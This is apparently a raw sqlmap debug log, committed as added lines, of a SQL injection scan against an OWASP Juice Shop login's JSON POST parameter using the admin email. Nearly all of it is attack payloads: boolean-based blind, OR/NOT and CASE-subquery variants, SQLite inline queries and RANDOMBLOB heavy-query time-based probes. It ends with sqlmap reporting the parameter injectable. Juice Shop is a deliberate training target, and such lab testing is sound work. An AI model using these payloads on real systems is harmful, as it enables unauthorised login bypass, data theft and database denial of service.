+[17:06:29] [PAYLOAD] admin@juice-sh.op'))) AND 3908=3908 AND ((('ZMeE'='ZMeE
+[17:06:33] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:06:33] [PAYLOAD] admin@juice-sh.op' AND 7364=8994 AND 'TimF'='TimF
+[17:06:38] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:06:38] [PAYLOAD] admin@juice-sh.op' AND 3908=3908 AND 'nkpe'='nkpe
+[17:06:41] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:06:41] [PAYLOAD] admin@juice-sh.op') AND 6114=5118 AND ('JQSD' LIKE 'JQSD
+[17:06:45] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:06:45] [PAYLOAD] admin@juice-sh.op') AND 3908=3908 AND ('ktwf' LIKE 'ktwf
+[17:06:49] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:06:49] [PAYLOAD] admin@juice-sh.op')) AND 9944=7654 AND (('iNup' LIKE 'iNup
+[17:06:53] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:06:53] [PAYLOAD] admin@juice-sh.op')) AND 3908=3908 AND (('HzpA' LIKE 'HzpA
+[17:06:56] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:06:56] [PAYLOAD] admin@juice-sh.op%' AND 3248=4279 AND 'HrLd%'='HrLd
+[17:07:00] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:07:00] [PAYLOAD] admin@juice-sh.op%' AND 3908=3908 AND 'WHKN%'='WHKN
+[17:07:04] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:07:04] [PAYLOAD] admin@juice-sh.op' AND 1660=4533 AND 'mUFy' LIKE 'mUFy
+[17:07:08] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:07:08] [PAYLOAD] admin@juice-sh.op' AND 3908=3908 AND 'Ferc' LIKE 'Ferc
+[17:07:11] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:07:11] [PAYLOAD] admin@juice-sh.op") AND 4015=6041 AND ("QAFV"="QAFV
+[17:07:15] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:07:15] [PAYLOAD] admin@juice-sh.op") AND 3908=3908 AND ("trvf"="trvf
+[17:07:18] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:07:18] [PAYLOAD] admin@juice-sh.op")) AND 3398=3032 AND (("oMvF"="oMvF
+[17:07:22] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:07:22] [PAYLOAD] admin@juice-sh.op")) AND 3908=3908 AND (("jOPR"="jOPR
+[17:07:26] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:07:26] [PAYLOAD] admin@juice-sh.op" AND 8690=8230 AND "ymFg"="ymFg
+[17:07:30] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:07:30] [PAYLOAD] admin@juice-sh.op" AND 3908=3908 AND "dlbX"="dlbX
+[17:07:33] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:07:33] [PAYLOAD] admin@juice-sh.op") AND 5292=5274 AND ("FvAu" LIKE "FvAu
+[17:07:37] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:07:37] [PAYLOAD] admin@juice-sh.op") AND 3908=3908 AND ("bhqD" LIKE "bhqD
+[17:07:41] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:07:41] [PAYLOAD] admin@juice-sh.op" AND 8413=3434 AND "JxHG" LIKE "JxHG
+[17:07:44] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:07:44] [PAYLOAD] admin@juice-sh.op" AND 3908=3908 AND "RKXB" LIKE "RKXB
+[17:07:47] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:07:47] [PAYLOAD] admin@juice-sh.op AND 6328=7381-- lfSE
+[17:07:51] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:07:51] [PAYLOAD] admin@juice-sh.op AND 3908=3908-- eNlS
+[17:07:54] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:07:54] [PAYLOAD] admin@juice-sh.op AND 9335=9103# fbbL
+[17:07:58] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:07:58] [PAYLOAD] admin@juice-sh.op AND 3908=3908# lLyu
+[17:08:01] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:08:01] [PAYLOAD] admin@juice-sh.op' AND 6141=8816 OR 'ZryW'='HlsN
+[17:08:06] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:08:06] [PAYLOAD] admin@juice-sh.op' AND 3908=3908 OR 'AbXu'='SVaD
+[17:08:09] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:08:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[17:08:09] [PAYLOAD] -9296
+[17:08:12] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:08:12] [PAYLOAD] -8007) OR 9478=7319-- BEwW
+[17:08:16] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:08:16] [PAYLOAD] -9615) OR 9608=9608-- bcMt
+[17:08:20] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:08:20] [PAYLOAD] -4961' OR 2378=5674-- SzlN
+[17:08:23] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:08:23] [PAYLOAD] -1829' OR 9608=9608-- FYDQ
+[17:08:27] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:08:27] [PAYLOAD] -3226) OR 4094=6713 AND (1865=1865
+[17:08:31] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:08:31] [PAYLOAD] -8658) OR 9608=9608 AND (1923=1923
+[17:08:34] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:08:34] [PAYLOAD] -5861)) OR 9498=8290 AND ((7725=7725
+[17:08:38] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:08:38] [PAYLOAD] -2740)) OR 9608=9608 AND ((1845=1845
+[17:08:42] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:08:42] [PAYLOAD] -9587))) OR 6711=1701 AND (((8595=8595
+[17:08:44] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:08:44] [PAYLOAD] -9465))) OR 9608=9608 AND (((9825=9825
+[17:08:48] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:08:48] [PAYLOAD] -3921 OR 5348=7943
+[17:08:52] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:08:52] [PAYLOAD] -7579 OR 9608=9608
+[17:08:55] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:08:55] [PAYLOAD] -9058') OR 8089=7899 AND ('UfPO'='UfPO
+[17:08:58] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:08:58] [PAYLOAD] -8815') OR 9608=9608 AND ('nuoa'='nuoa
+[17:09:02] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:09:02] [PAYLOAD] -7686')) OR 2576=3241 AND (('DCzB'='DCzB
+[17:09:05] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:09:05] [PAYLOAD] -9264')) OR 9608=9608 AND (('RoKh'='RoKh
+[17:09:09] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:09:09] [PAYLOAD] -6561'))) OR 9301=6164 AND ((('AwHH'='AwHH
+[17:09:12] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:09:12] [PAYLOAD] -7592'))) OR 9608=9608 AND ((('NkVV'='NkVV
+[17:09:16] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:09:16] [PAYLOAD] -7622' OR 8920=8810 AND 'ZRiI'='ZRiI
+[17:09:20] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:09:20] [PAYLOAD] -2262' OR 9608=9608 AND 'dUft'='dUft
+[17:09:23] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:09:23] [PAYLOAD] -4576') OR 2741=1334 AND ('sJQE' LIKE 'sJQE
+[17:09:28] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:09:28] [PAYLOAD] -1391') OR 9608=9608 AND ('utfh' LIKE 'utfh
+[17:09:31] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:09:31] [PAYLOAD] -8752')) OR 6899=6359 AND (('CJpj' LIKE 'CJpj
+[17:09:35] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:09:35] [PAYLOAD] -1093')) OR 9608=9608 AND (('Oubs' LIKE 'Oubs
+[17:09:39] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:09:39] [PAYLOAD] -5511%' OR 1290=7320 AND 'wqpH%'='wqpH
+[17:09:41] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:09:41] [PAYLOAD] -4186%' OR 9608=9608 AND 'cFzc%'='cFzc
+[17:09:45] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:09:45] [PAYLOAD] -1510' OR 8653=7593 AND 'tCIN' LIKE 'tCIN
+[17:09:49] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:09:49] [PAYLOAD] -4556' OR 9608=9608 AND 'NilS' LIKE 'NilS
+[17:09:53] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:09:53] [PAYLOAD] -5280") OR 1090=1735 AND ("wzRd"="wzRd
+[17:09:56] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:09:56] [PAYLOAD] -3135") OR 9608=9608 AND ("HXPz"="HXPz
+[17:10:00] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:10:00] [PAYLOAD] -5185")) OR 2087=4313 AND (("Yewq"="Yewq
+[17:10:04] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:10:04] [PAYLOAD] -5945")) OR 9608=9608 AND (("nnVS"="nnVS
+[17:10:08] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:10:08] [PAYLOAD] -6818" OR 2007=2055 AND "Kubt"="Kubt
+[17:10:12] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:10:12] [PAYLOAD] -5806" OR 9608=9608 AND "ExKO"="ExKO
+[17:10:15] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:10:15] [PAYLOAD] -4984") OR 4993=7006 AND ("BbJo" LIKE "BbJo
+[17:10:19] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:10:19] [PAYLOAD] -1451") OR 9608=9608 AND ("AkGP" LIKE "AkGP
+[17:10:23] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:10:23] [PAYLOAD] -8264" OR 1454=8191 AND "adwz" LIKE "adwz
+[17:10:26] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:10:26] [PAYLOAD] -7294" OR 9608=9608 AND "dFmm" LIKE "dFmm
+[17:10:30] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:10:30] [PAYLOAD] -5630 OR 6533=1154-- bvNX
+[17:10:33] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:10:33] [PAYLOAD] -8216 OR 9608=9608-- imCx
+[17:10:37] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:10:37] [PAYLOAD] -7596 OR 7201=7265# WrCs
+[17:10:40] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:10:40] [PAYLOAD] -7236 OR 9608=9608# zmFR
+[17:10:44] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:10:44] [PAYLOAD] -8048' OR 6736=6439 OR 'rWkG'='jrlr
+[17:10:48] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:10:48] [PAYLOAD] -4160' OR 9608=9608 OR 'HAsv'='ATvq
+[17:10:52] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:10:52] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[17:10:52] [PAYLOAD] admin@juice-sh.op) OR NOT 6364=7627-- RLdI
+[17:10:55] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:10:55] [PAYLOAD] admin@juice-sh.op) OR NOT 4615=4615-- ngLb
+[17:10:59] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:10:59] [PAYLOAD] admin@juice-sh.op' OR NOT 3016=2469-- XPoh
+[17:11:03] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:11:03] [PAYLOAD] admin@juice-sh.op' OR NOT 4615=4615-- nzro
+[17:11:06] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:11:06] [PAYLOAD] admin@juice-sh.op) OR NOT 1888=8467 AND (9108=9108
+[17:11:10] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:11:10] [PAYLOAD] admin@juice-sh.op) OR NOT 4615=4615 AND (9666=9666
+[17:11:13] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:11:13] [PAYLOAD] admin@juice-sh.op)) OR NOT 9302=8883 AND ((9521=9521
+[17:11:17] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:11:17] [PAYLOAD] admin@juice-sh.op)) OR NOT 4615=4615 AND ((1079=1079
+[17:11:20] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:11:20] [PAYLOAD] admin@juice-sh.op))) OR NOT 7913=2594 AND (((9139=9139
+[17:11:24] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:11:24] [PAYLOAD] admin@juice-sh.op))) OR NOT 4615=4615 AND (((5645=5645
+[17:11:28] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:11:28] [PAYLOAD] admin@juice-sh.op OR NOT 9418=5131
+[17:11:31] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:11:31] [PAYLOAD] admin@juice-sh.op OR NOT 4615=4615
+[17:11:35] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:11:35] [PAYLOAD] admin@juice-sh.op') OR NOT 5666=1252 AND ('IGSE'='IGSE
+[17:11:39] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:11:39] [PAYLOAD] admin@juice-sh.op') OR NOT 4615=4615 AND ('UBSK'='UBSK
+[17:11:42] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:11:42] [PAYLOAD] admin@juice-sh.op')) OR NOT 8192=1592 AND (('zzoB'='zzoB
+[17:11:46] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:11:46] [PAYLOAD] admin@juice-sh.op')) OR NOT 4615=4615 AND (('LFGL'='LFGL
+[17:11:49] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:11:49] [PAYLOAD] admin@juice-sh.op'))) OR NOT 5643=1899 AND ((('phPY'='phPY
+[17:11:53] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:11:53] [PAYLOAD] admin@juice-sh.op'))) OR NOT 4615=4615 AND ((('ypaQ'='ypaQ
+[17:11:58] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:11:58] [PAYLOAD] admin@juice-sh.op' OR NOT 2788=2415 AND 'GZOY'='GZOY
+[17:12:01] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:12:01] [PAYLOAD] admin@juice-sh.op' OR NOT 4615=4615 AND 'cvVN'='cvVN
+[17:12:05] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:12:05] [PAYLOAD] admin@juice-sh.op') OR NOT 6768=7779 AND ('Hzpv' LIKE 'Hzpv
+[17:12:08] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:12:08] [PAYLOAD] admin@juice-sh.op') OR NOT 4615=4615 AND ('exsm' LIKE 'exsm
+[17:12:12] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:12:12] [PAYLOAD] admin@juice-sh.op')) OR NOT 7902=9458 AND (('KSVZ' LIKE 'KSVZ
+[17:12:16] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:12:16] [PAYLOAD] admin@juice-sh.op')) OR NOT 4615=4615 AND (('gdkW' LIKE 'gdkW
+[17:12:19] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:12:19] [PAYLOAD] admin@juice-sh.op%' OR NOT 6984=4772 AND 'JjZT%'='JjZT
+[17:12:24] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:12:24] [PAYLOAD] admin@juice-sh.op%' OR NOT 4615=4615 AND 'SuQz%'='SuQz
+[17:12:27] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:12:27] [PAYLOAD] admin@juice-sh.op' OR NOT 5405=3462 AND 'JdAF' LIKE 'JdAF
+[17:12:31] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:12:31] [PAYLOAD] admin@juice-sh.op' OR NOT 4615=4615 AND 'vdCs' LIKE 'vdCs
+[17:12:35] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:12:35] [PAYLOAD] admin@juice-sh.op") OR NOT 4486=1190 AND ("dRWb"="dRWb
+[17:12:38] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:12:38] [PAYLOAD] admin@juice-sh.op") OR NOT 4615=4615 AND ("OeKx"="OeKx
+[17:12:42] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:12:42] [PAYLOAD] admin@juice-sh.op")) OR NOT 3000=7112 AND (("tsda"="tsda
+[17:12:45] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:12:45] [PAYLOAD] admin@juice-sh.op")) OR NOT 4615=4615 AND (("JdRZ"="JdRZ
+[17:12:49] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:12:49] [PAYLOAD] admin@juice-sh.op" OR NOT 2517=1323 AND "QofO"="QofO
+[17:12:53] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:12:53] [PAYLOAD] admin@juice-sh.op" OR NOT 4615=4615 AND "eiSR"="eiSR
+[17:12:56] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:12:56] [PAYLOAD] admin@juice-sh.op") OR NOT 3675=8465 AND ("JBHE" LIKE "JBHE
+[17:13:00] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:13:00] [PAYLOAD] admin@juice-sh.op") OR NOT 4615=4615 AND ("czJA" LIKE "czJA
+[17:13:04] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:13:04] [PAYLOAD] admin@juice-sh.op" OR NOT 5100=9433 AND "pDhF" LIKE "pDhF
+[17:13:08] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:13:08] [PAYLOAD] admin@juice-sh.op" OR NOT 4615=4615 AND "FncU" LIKE "FncU
+[17:13:12] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:13:12] [PAYLOAD] admin@juice-sh.op OR NOT 1037=2039-- hLPq
+[17:13:15] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:13:15] [PAYLOAD] admin@juice-sh.op OR NOT 4615=4615-- qTqn
+[17:13:19] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:13:19] [PAYLOAD] admin@juice-sh.op OR NOT 5090=1039# QHUq
+[17:13:23] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:13:23] [PAYLOAD] admin@juice-sh.op OR NOT 4615=4615# ZDfQ
+[17:13:26] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:13:26] [PAYLOAD] admin@juice-sh.op' OR NOT 8605=8172 OR 'IRQq'='rdaM
+[17:13:30] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:13:30] [PAYLOAD] admin@juice-sh.op' OR NOT 4615=4615 OR 'OXPC'='CEVR
+[17:13:33] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:13:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[17:13:33] [PAYLOAD] admin@juice-sh.op) AND 9269=(SELECT (CASE WHEN (9269=5487) THEN 9269 ELSE (SELECT 5487 UNION SELECT 1480) END))-- ipPV
+[17:13:41] [PAYLOAD] admin@juice-sh.op) AND 7464=(SELECT (CASE WHEN (7464=7464) THEN 7464 ELSE (SELECT 1026 UNION SELECT 7357) END))-- OPDy
+[17:14:11] [WARNING] there is a possibility that the target (or WAF/IPS) is dropping 'suspicious' requests
+[17:14:11] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
+[17:14:41] [DEBUG] connection timed out to the target URL. sqlmap is going to retry the request
+[17:14:42] [PAYLOAD] admin@juice-sh.op) AND 4781=(SELECT (CASE WHEN (4781=1829) THEN 4781 ELSE (SELECT 1829 UNION SELECT 5171) END))-- odJn
+[17:14:42] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:14:42] [INFO] (custom) POST parameter 'JSON #1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable 
+[17:14:42] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)' because the payload for boolean-based blind has already been identified
+[17:14:42] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (comment)' because the payload for boolean-based blind has already been identified
+[17:14:42] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (comment)' because the payload for boolean-based blind has already been identified
+[17:14:42] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)' because the payload for boolean-based blind has already been identified
+[17:14:42] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (original value)' because the payload for boolean-based blind has already been identified
+[17:14:42] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (DUAL)' because the payload for boolean-based blind has already been identified
+[17:14:42] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (DUAL - original value)' because the payload for boolean-based blind has already been identified
+[17:14:42] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (CASE)' because the payload for boolean-based blind has already been identified
+[17:14:42] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (CASE - original value)' because the payload for boolean-based blind has already been identified
+[17:14:42] [DEBUG] skipping test 'HAVING boolean-based blind - WHERE, GROUP BY clause' because the payload for boolean-based blind has already been identified
+[17:14:42] [INFO] testing 'Generic inline queries'
+[17:14:42] [PAYLOAD] (SELECT CONCAT(CONCAT(CHAR(113,107,98,113,113),(CASE WHEN (7895=7895) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113,120,120,120,113)))
+[17:14:43] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:14:43] [DEBUG] skipping test 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)' because the payload for boolean-based blind has already been identified
+[17:14:43] [DEBUG] skipping test 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)' because the payload for boolean-based blind has already been identified
+[17:14:43] [INFO] testing 'SQLite inline queries'
+[17:14:43] [PAYLOAD] SELECT CHAR(113,107,98,113,113)||(CASE WHEN (5852=5852) THEN 1 ELSE 0 END)||CHAR(113,120,120,120,113)
+[17:14:44] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
+[17:14:44] [PAYLOAD] admin@juice-sh.op);SELECT LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))--
+[17:14:44] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
+[17:14:45] [DEBUG] skipping test 'SQLite > 2.0 stacked queries (heavy query)' because the level (5) is higher than the provided (3)
+[17:14:45] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
+[17:14:45] [PAYLOAD] admin@juice-sh.op) AND 2116=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- vGcK
+[17:14:45] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:14:45] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query)'
+[17:14:45] [PAYLOAD] admin@juice-sh.op) OR 3121=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- hdQi
+[17:14:46] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:14:46] [DEBUG] skipping test 'SQLite > 2.0 AND time-based blind (heavy query - comment)' because the level (5) is higher than the provided (3)
+[17:14:46] [DEBUG] skipping test 'SQLite > 2.0 OR time-based blind (heavy query - comment)' because the level (5) is higher than the provided (3)
+[17:14:46] [DEBUG] skipping test 'SQLite > 2.0 time-based blind - Parameter replace (heavy query)' because the level (4) is higher than the provided (3)
+[17:14:46] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (MAKE_SET)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (ELT)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (ELT - original value)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (bool*int)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (bool*int - original value)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace (original value)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'Oracle boolean-based blind - Parameter replace' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'Oracle boolean-based blind - Parameter replace (original value)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'Informix boolean-based blind - Parameter replace' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'Informix boolean-based blind - Parameter replace (original value)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'Microsoft Access boolean-based blind - Parameter replace' because the payload for boolean-based blind has already been identified
